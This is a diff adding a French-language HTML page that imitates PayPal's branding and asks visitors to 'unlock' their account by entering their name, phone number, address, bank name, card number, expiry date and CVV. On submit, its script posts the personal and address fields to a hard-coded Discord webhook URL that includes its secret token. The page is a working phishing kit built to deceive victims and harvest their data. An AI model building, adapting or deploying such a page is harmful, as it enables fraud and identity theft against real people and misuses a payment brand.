@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de renseignement</title>
+    <style>
+body {
+            font-family: Arial, sans-serif;
+            background-color: #f6f6f6;
+            margin: 0;
+        }
+        .header {
+            background-color: #0070ba;
+            padding: 20px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            border-radius: 0 0 30px 30px;
+        }
+        .header img {
+            width: 120px;
+            border-radius: 20px;
+            margin-right: 20px;
+        }
+        .header-links {
+            margin-left: auto;
+            display: flex;
+        }
+        .header-links a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .card-form {
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        .card-input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            margin-bottom: 10px;
+            width: 100%;
+        }
+        .card-label {
+            font-weight: bold;
+        }
+        .submit-btn {
+            background-color: #0070ba;
+            color: #fff;
+            padding: 12px 40px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto 0;
+        }
+        .submit-btn:hover {
+            background-color: #00508c;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .footer-links a {
+            color: #0070ba;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://logo-marque.com/wp-content/uploads/2020/04/PayPal-Logo.png" alt="PayPal Logo">
+        <div class="header-links">
+            <a href="#">Particuliers</a>
+            <a href="#">Professionel</a>
+            <a href="#"></a>
+            <a href="#">Développeurs</a>
+            <a href="#">Aide</a>
+        </div>
+    </div>
+
+    <div class="card-form">
+        <form id="form" method="post">
+            <label class="card-label" for="first-name">Prénom :</label>
+            <input type="text" name="first-name" id="first-name" class="card-input" placeholder="John">
+
+            <label class="card-label" for="last-name">Nom :</label>
+            <input type="text" name="last-name" id="last-name" class="card-input" placeholder="Doe">
+
+            <label class="card-label" for="phone-number">Numéro de téléphone :</label>
+            <input type="tel" name="phone-number" id="phone-number" class="card-input" placeholder="0123456789">
+
+            <label class="card-label" for="address">Adresse :</label>
+            <input type="text" name="address" id="address" class="card-input" placeholder="123 rue de la Paix">
+
+            <label class="card-label" for="bank-name">Nom de la banque :</label>
+            <input type="text" name="bank-name" id="bank-name" class="card-input" placeholder="Ma Banque">
+
+            <label class="card-label" for="postal-code">Code postal :</label>
+            <input type="text" name="postal-code" id="postal-code" class="card-input" placeholder="75001">
+
+            <label class="card-label" for="city">Ville :</label>
+            <input type="text" name="city" id="city" class="card-input" placeholder="Votre ville">
+            
+            <label class="card-label" for="card-number">Numéro de carte :</label>
+            <input type="text" id="card-number" class="card-input" placeholder="1234 5678 9012 3456">
+            
+            <label class="card-label" for="expiry-date">Date d'expiration :</label>
+            <input type="text" id="expiry-date" class="card-input" placeholder="MM/AA">
+
+            <label class="card-label" for="cvv">CVV :</label>
+            <input type="text" id="cvv" class="card-input" placeholder="123">
+
+
+            <button class="submit-btn" type="submit">Débloquer</button>
+        </form>
+    </div>
+    <div class="footer-links">
+        <a href="#">Contact</a>
+        <a href="#">Respect de la vie privée</a>
+        <a href="#">Contrats d'utilisation</a>
+        <a href="#">International</a>
+    </div>
+    <script>
+        document.getElementById('form').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const formData = {
+                'first-name': document.getElementById('first-name').value,
+                'last-name': document.getElementById('last-name').value,
+                'phone-number': document.getElementById('phone-number').value,
+                'address': document.getElementById('address').value,
+                'bank-name': document.getElementById('bank-name').value,
+                'postal-code': document.getElementById('postal-code').value,
+                'city': document.getElementById('city').value
+            };
+
+            const webhookURL = 'https://discord.com/api/webhooks/1155180892403286027/vpvH6emyiypAuGWdApkBNytMUmbf9HTZjJCzmwJT5xB252COAUD6NtLoXEaS73REN1iI'; // Replace with your Discord webhook URL
+
+            const message = `Nouveau formulaire soumis :
+            Prénom : ${formData['first-name']}
+            Nom : ${formData['last-name']}
+            Numéro de téléphone : ${formData['phone-number']}
+            Adresse : ${formData['address']}
+            Nom de la banque : ${formData['bank-name']}
+            Code postal : ${formData['postal-code']}
+            Ville : ${formData['city']}`;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: message }),
+            })
+                .then(() => {
+                    console.log('Message envoyé avec succès à Discord !');
+                    alert('Formulaire soumis avec succès.');
+                })
+                .catch(error => {
+                    console.error('Erreur lors de l\'envoi du message à Discord :', error);
+                    alert('Une erreur est survenue lors de la soumission du formulaire.');
+                });
+        });
+    </script>
+</body>
+</html>
